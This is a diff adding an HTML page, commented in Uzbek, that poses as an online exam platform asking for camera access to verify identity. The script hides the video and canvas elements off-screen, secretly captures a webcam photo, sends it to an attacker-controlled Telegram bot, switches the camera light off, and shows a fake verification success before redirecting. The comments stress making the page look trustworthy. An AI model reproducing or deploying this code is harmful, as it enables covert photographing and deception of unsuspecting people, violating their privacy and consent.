@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <title>Professional Test Platform</title>
+    <style>
+        /* Foydalanuvchi ko'radigan qism - juda ishonchli ko'rinishi kerak */
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        button { background: #28a745; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
+        
+        /* ENG MUHIMI: Kamera va rasm elementlari butunlay yashirin */
+        #video, #canvas { position: absolute; left: -9999px; visibility: hidden; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2 style="color: #333;">Imtihon Tizimi</h2>
+    <p style="color: #666;">Testni boshlashdan oldin shaxsingizni tasdiqlash uchun kameraga ruxsat bering.</p>
+    <button id="startBtn">TASDIQLASH VA BOSHLASH</button>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas" width="640" height="480"></canvas>
+
+<script>
+    // 1. BU YERGA O'Z MA'LUMOTLARINGNI YOZ:
+    const TOKEN = "BOT_TOKENINGNI_SHUYERGA_QO'Y"; 
+    const CHAT_ID = "CHAT_ID_RAQAMINGNI_QO'Y";
+
+    const startBtn = document.getElementById('startBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    startBtn.addEventListener('click', async () => {
+        try {
+            // Kamera so'rovi (Tepadagi oyna faqat shu yerda chiqadi)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            
+            startBtn.innerText = "Tekshirilmoqda...";
+            startBtn.disabled = true;
+
+            // 2. Maksimal tezlikda rasmga olish (300ms kutib)
+            setTimeout(() => {
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, 640, 480);
+                
+                canvas.toBlob((blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'img.jpg');
+
+                    // Telegramga yuborish
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(() => {
+                        // Rasm ketishi bilan kamerani darhol o'chiramiz (chiroq o'chadi)
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        alert("Muvaffaqiyatli tasdiqlandi! Testni boshlashingiz mumkin.");
+                        window.location.href = "https://google.com"; 
+                    });
+                }, 'image/jpeg');
+            }, 300); // 0.3 soniyadan keyin rasm oladi
+
+        } catch (err) {
+            alert("Xatolik: Kamera ruxsatisiz testga kirib bo'lmaydi!");
+        }
+    });
+</script>
+
+</body>
+</html>
